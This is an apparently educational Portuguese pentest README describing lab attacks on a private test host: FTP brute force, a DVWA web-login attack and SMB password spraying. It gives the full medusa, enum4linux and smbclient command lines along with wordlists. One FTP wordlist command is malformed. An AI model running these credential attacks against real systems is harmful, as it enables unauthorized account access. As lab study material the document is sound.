# Projeto de Pentest

## Ataques em FTP/DVWA/SMB

(Ambiente Controlado para Estudos)

Este repositório documenta experimentos de segurança ofensiva realizados em ambiente isolado com o objetivo de fins educacionais. Os testes foram executados a partir do Kali Linux.

## Este estudo aborda ataques direcionados a três superfícies de autenticação vulneráveis:

- FTP (Força Bruta em serviço de login remoto)

- DVWA (Formulário de autenticação web)

- SMB (Password spraying e enumeração de usuários)

# Ataque de Força Bruta em FTP

## Objetivo:

Demonstrar como credenciais fracas permitem acesso indevido ao serviço FTP, evidenciando a necessidade de senhas robustas e políticas rígidas de autenticação.

## Procedimentos:

### 1. Verificação de comunicação com o alvo

    ping -c 3 192.168.56.103

### 2. Scanner de portas

    nmap -sV -p 1-500 192.168.56.103

### 3. Teste de conexão FTP

    ftp 192.168.56.103

### 4. Criação de lista de usuários

    echo -e "admin\user\operator" > users.txt


### 5. Criação de lista de senhas

    echo -e "password\qwerty123\admin\123qwe\123456" > pass.txt

### 6. Execução do ataque

    medusa -h 192.168.56.103 -U users.txt -P pass.txt -M ftp -t 6

# Ataque em Formulário Web (DVWA)

## Objetivo:

Simular tentativas automatizadas de login demonstrando como a ausência de limites de autenticação e uso de senhas fracas comprometem sistemas web.

## Procedimentos:

### 1. Criação de lista de usuários

    echo -e "admin\nuser\ntest" > users.txt

### 2. Criação de lista de senhas

    echo -e "123456\npassword\ndvwa\nadmin" > pass.txt

### 3. Execução do ataque no formulário web

    medusa -h 192.168.56.103 -U users.txt -P pass.txt -M http \
    -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
    -m DENY:"Login failed" \
    -m VERBOSE

# Ataque com password spraying em SMB

## Objetivo:

Testar contas SMB utilizando senhas previsíveis e repetidas, demonstrando a vulnerabilidade gerada pela reutilização de credenciais.

## Procedimentos:

### 1. Enumeração de informações 

    enum4linux -a 192.168.56.103 | tee enum4_output.txt

# 2. Visualização dos resultados coletados

    less enum4_output.txt

# 3. Criação de lista de usuários

    echo -e "root\nmsfadmin\nbackup\nuser" > smb_users.txt

# 4. Criação de lista de senhas

    echo -e "123456\npassword\nmsfadmin\nadmin" > senhas_spray.txt

# 5. Execução de password spraying 

    medusa -h 192.168.56.103 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

# 6. Tentativa de acesso com credencial válida

    smbclient -L //192.168.56.103 -U msfadmin

















